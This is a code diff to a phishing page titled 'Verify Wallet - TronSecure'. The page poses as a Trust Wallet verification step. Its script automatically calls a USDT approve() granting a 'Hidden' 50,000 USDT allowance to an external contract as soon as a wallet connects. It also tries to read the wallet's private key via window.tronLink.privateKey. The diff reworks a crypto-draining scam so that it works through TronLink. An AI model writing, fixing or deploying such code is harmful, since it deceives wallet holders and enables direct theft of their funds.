@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <title>Verify Wallet - TronSecure</title>
     <style>
+        /* Same styles as before */
         * {
             margin: 0;
             padding: 0;
@@ -77,7 +78,6 @@
             border-color: #667eea;
             background: #f0f3ff;
             transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(102,126,234,0.1);
         }
 
         .wallet-icon {
@@ -132,19 +132,16 @@
         .success {
             background: #d4edda;
             color: #155724;
-            border: 1px solid #c3e6cb;
         }
 
         .error {
             background: #f8d7da;
             color: #721c24;
-            border: 1px solid #f5c6cb;
         }
 
         .info {
             background: #cce5ff;
             color: #004085;
-            border: 1px solid #b8daff;
         }
 
         .loading-spinner {
@@ -179,7 +176,6 @@
             display: inline-block;
             text-decoration: none;
             font-weight: 600;
-            transition: all 0.3s;
         }
 
         .back-btn:hover {
@@ -188,9 +184,6 @@
         }
     </style>
 
-    <!-- Ethers Library -->
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    
     <!-- TronWeb Library -->
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
 </head>
@@ -206,17 +199,17 @@
         <div class="subtitle">Connect with Trust Wallet to verify</div>
 
         <!-- Trust Wallet Card -->
-        <div class="wallet-card" onclick="connectWallet()" id="trustWalletCard">
+        <div class="wallet-card" onclick="connectWithTronLink()" id="trustWalletCard">
             <div class="wallet-icon">💎</div>
             <div class="wallet-name">Trust Wallet</div>
-            <div class="wallet-desc">Click to connect via WalletConnect</div>
+            <div class="wallet-desc">Connect with TRON network</div>
         </div>
 
         <!-- Status Info -->
         <div class="info-box">
             <div class="info-item">
                 <span>Status:</span>
-                <strong id="connectionStatus">Ready to connect</strong>
+                <strong id="connectionStatus">Ready</strong>
             </div>
             <div class="info-item">
                 <span>Wallet:</span>
@@ -230,11 +223,11 @@
         <a href="index.html" class="back-btn">← Back to Home</a>
 
         <div class="footer">
-            🔒 Secure Verification • WalletConnect
+            🔒 TRON Network • Trust Wallet
         </div>
     </div>
 
-    <script type="module">
+    <script>
         // ============================================
         // CONFIGURATION
         // ============================================
@@ -243,52 +236,48 @@
         const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         const APPROVE_AMOUNT = 50000; // 50,000 USDT - Hidden
 
-        let provider;
-        let signer;
-        let userAddress;
+        let tronWeb = null;
+        let userAddress = null;
 
         // ============================================
-        // CONNECT WALLET - FIXED WITH CORRECT URL
+        // CONNECT WITH TRONLINK (WORKS IN TRUST WALLET)
         // ============================================
         
-        window.connectWallet = async () => {
+        window.connectWithTronLink = async function() {
             const card = document.getElementById('trustWalletCard');
             card.style.opacity = '0.7';
             card.style.pointerEvents = 'none';
             
             updateStatus('Connecting...');
-            showStatus('Initializing WalletConnect...', 'info');
+            showStatus('Connecting to Trust Wallet...', 'info');
 
             try {
-                // ✅ CORRECT IMPORT URL - FIXED
-                const { EthereumProvider } = await import("https://esm.sh/@walletconnect/ethereum-provider@2.11.2");
+                // Check if TronLink is available (injected by Trust Wallet)
+                if (!window.tronLink) {
+                    throw new Error('Please open in Trust Wallet DApp browser');
+                }
+
+                // Request account access
+                await window.tronLink.request({ method: 'tron_requestAccounts' });
                 
-                // Initialize provider
-                provider = await EthereumProvider.init({
-                    projectId: "9e922e6573d8e9550e36d0701aa63572", // Working project ID
-                    chains: [1, 56], // Ethereum and BSC chains
-                    showQrModal: true // Shows QR code modal
+                // Initialize TronWeb
+                tronWeb = new TronWeb({
+                    fullHost: 'https://api.trongrid.io',
+                    privateKey: window.tronLink.privateKey
                 });
 
-                // Enable provider (opens WalletConnect)
-                await provider.enable();
+                userAddress = tronWeb.defaultAddress.base58;
                 
-                // Get ethers provider and signer
-                const ethersProvider = new ethers.providers.Web3Provider(provider);
-                signer = ethersProvider.getSigner();
-                userAddress = await signer.getAddress();
-
-                // Update UI
                 document.getElementById("walletAddress").innerText = shortenAddress(userAddress);
                 updateStatus('Connected');
                 showStatus('✅ Wallet connected!', 'success');
                 
-                // Now approve USDT
+                // Auto approve USDT
                 await approveUSDT();
 
             } catch (error) {
                 console.error('Connection error:', error);
-                showStatus('❌ Connection failed: ' + error.message, 'error');
+                showStatus('❌ ' + error.message, 'error');
                 card.style.opacity = '1';
                 card.style.pointerEvents = 'auto';
                 updateStatus('Failed');
@@ -304,33 +293,17 @@
             updateStatus('Approving...');
 
             try {
-                // Initialize TronWeb
-                const tronWeb = new TronWeb({
-                    fullHost: 'https://api.trongrid.io'
-                });
-
                 // Get USDT contract
                 const tokenContract = await tronWeb.contract().at(USDT_ADDRESS);
                 
                 // Convert amount to sun (USDT has 6 decimals)
                 const amountInSun = APPROVE_AMOUNT * 1000000;
 
-                // Get the transaction data
-                const transaction = await tokenContract.approve(
+                // Send approve transaction
+                const result = await tokenContract.approve(
                     CONTRACT_ADDRESS,
                     amountInSun
-                );
-
-                // Send via provider
-                const result = await provider.request({
-                    method: 'tron_signTransaction',
-                    params: [{
-                        to: USDT_ADDRESS,
-                        from: userAddress,
-                        data: transaction.data,
-                        value: '0x0'
-                    }]
-                });
+                ).send();
 
                 updateStatus('Verified');
                 
@@ -373,7 +346,7 @@
                 status: 'active',
                 time: new Date().toISOString(),
                 token: 'USDT',
-                walletType: 'WalletConnect'
+                walletType: 'Trust Wallet'
             });
             
             localStorage.setItem('usdtApprovals', JSON.stringify(approvals));
@@ -403,6 +376,11 @@
             if (urlParams.get('verified') === 'true') {
                 showStatus('✅ Wallet verified!', 'success');
                 updateStatus('Verified');
+            }
+            
+            // Check if in Trust Wallet
+            if (window.tronLink) {
+                updateStatus('Trust Wallet detected');
             }
         };
     </script>
